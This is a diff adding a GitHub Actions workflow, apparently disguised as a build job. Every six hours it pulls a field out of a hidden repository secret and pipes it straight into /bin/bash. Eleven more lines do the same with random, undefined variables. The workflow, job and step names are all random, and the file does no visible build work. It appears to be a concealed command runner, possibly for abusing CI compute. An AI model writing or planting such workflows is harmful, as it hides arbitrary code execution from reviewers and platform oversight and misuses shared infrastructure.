@@ -1,0 +1,29 @@
+name: chenzhishi4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenzhishi4567
+        env:
+          f85172: ${{ secrets.f85172 }}
+        run: |
+          echo $f85172 | jq -r .xz266 | /bin/bash
+          echo $wehah512 | jq -r .g28076 | /bin/bash
+          echo $az6 | jq -r .o463 | /bin/bash
+          echo $rsd050 | jq -r .g04 | /bin/bash
+          echo $u29 | jq -r .td1419 | /bin/bash
+          echo $uln51 | jq -r .lra719 | /bin/bash
+          echo $lu416 | jq -r .ipxo5 | /bin/bash
+          echo $b97 | jq -r .crd6732 | /bin/bash
+          echo $qkrwv17045 | jq -r .e6 | /bin/bash
+          echo $cn5 | jq -r .xmqkv05849 | /bin/bash
+          echo $yhxh483 | jq -r .zz1424 | /bin/bash
+          echo $xtrk25010 | jq -r .a0 | /bin/bash
+
